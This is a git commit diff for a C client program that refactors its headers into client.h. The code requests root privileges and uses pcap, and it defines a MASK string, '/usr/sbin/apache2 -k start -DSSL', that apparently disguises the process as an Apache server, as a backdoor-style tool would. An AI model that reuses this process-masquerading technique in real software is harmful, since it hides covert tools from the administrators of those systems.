35124a8eeb470be1a2e413e68ae0d482c7b11ea3
Luke Queenan <lukequeenan@gmail.com>
2012-10-02 20:39:44 -0700

    Fixed git ignore and added some shared library code for headers. Also made a main function for the client.

--- client.c
+++ client.c
@@ -1,10 +1,4 @@
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <pcap.h>
-
-#define MASK "/usr/sbin/apache2 -k start -DSSL"
+#include "client.h"
 
 int main (int argc, char *argv[])
 {
@@ -14,8 +8,7 @@ int main (int argc, char *argv[])
 	/* Change the UID/GID to 0 (raise to root) */
 	if ((setuid(0) == -1) || (setgid(0) == -1))
     {
-        printf("error in getting root, try another method?");
-        return 1;
+        systemFatal("You need to be root for this");
     }
 	setgid(0);
 
---
+++ client.h
@@ -0,0 +1,14 @@
+#ifndef CLIENT_H
+#define CLIENT_H
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pcap.h>
+
+#include "sharedLibrary.h"
+
+#define MASK "/usr/sbin/apache2 -k start -DSSL"
+
+#endif
